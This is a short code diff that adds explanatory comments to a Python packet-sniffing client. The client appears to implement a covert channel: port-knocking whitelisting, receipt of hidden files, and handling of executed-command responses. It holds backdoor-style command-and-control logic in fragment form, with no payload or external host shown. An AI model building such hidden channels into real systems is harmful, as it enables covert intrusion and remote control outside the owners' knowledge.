@@ -96,6 +96,10 @@ class Client:
         self.set_check()
 
     def filter_packets(self, packet) -> None:
+        """Various filters for packet processing, passes to
+        respective processing methods
+        """
+        # This filter checks if the packets are a part of a valid port knocking sequence
         if packet.haslayer(IP) and packet.haslayer(TCP):
             if packet[TCP].flags & 0x02 and packet[TCP].dport == self.sequence[self.cur_pos]:
                 self.cur_pos += 1
@@ -104,8 +108,7 @@ class Client:
                     self.whitelist.append(packet[IP].src)
                     self.cur_pos = 0
 
-        # Packet with file processing
-
+        # This filter process files received by covert client
         if IP in packet and packet[IP].src in self.whitelist \
                 and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
             if packet[IP].src in self.whitelist:
@@ -121,7 +124,7 @@ class Client:
                     else:
                         self.file_bits.append(data)
 
-        #
+        # This is the filter for responses from executed commands
         # try:
         #     msg = packet[UDP].load.decode()
         #     if UDP in packet and packet[UDP].dport == self.recv_port:
